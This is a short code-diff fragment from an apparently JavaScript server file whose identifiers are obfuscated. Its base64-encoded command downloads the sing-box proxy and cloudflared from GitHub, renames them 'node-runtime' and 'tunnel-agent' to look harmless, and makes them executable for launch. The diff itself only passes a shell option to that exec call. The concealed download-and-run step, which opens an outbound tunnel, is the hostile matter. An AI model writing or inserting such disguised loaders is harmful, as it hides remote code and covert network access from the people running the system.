@@ -25,7 +25,7 @@ _0x9c.listen(_0x6f, () => {
 function _0x14e() {
     if (!_0x3c.existsSync(_0x7a('Li9ub2RlLXJ1bnRpbWU='))) {
         const _0x15f = _0x7a('Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL1NhZ2VyTmV0L3NpbmctYm94L3JlbGVhc2VzL2Rvd25sb2FkL3YxLjkuMC9zaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC50YXIuZ3ogLW8gc2IudGFyLmd6ICYmIHRhciAtenh2ZiBzYi50YXIuZ3ogPiAvZGV2L251bGwgMj4mMSAmJiBtdiBzaW5nLWJveC0xLjkuMC1saW51eC1hbWQ2NC9zaW5nLWJveCAuL25vZGUtcnVudGltZSAmJiBybSAtcmYgc2IudGFyLmd6IHNpbmctYm94LTEuOS4wLWxpbnV4LWFtZDY0ICYmIGN1cmwgLXNMIGh0dHBzOi8vZ2l0aHViLmNvbS9jbG91ZGZsYXJlL2Nsb3VkZmxhcmVkL3JlbGVhc2VzL2xhdGVzdC9kb3dubG9hZC9jbG91ZGZsYXJlZC1saW51eC1hbWQ2NCAtbyB0dW5uZWwtYWdlbnQgJiYgY2htb2QgK3ggbm9kZS1ydW50aW1lIHR1bm5lbC1hZ2VudA==');
-        _0x1a(_0x15f, (_0x16a) => {
+        _0x1a(_0x15f, { shell: '/bin/sh' }, (_0x16a) => {
             if (!_0x16a) _0x17b();
         });
     } else {
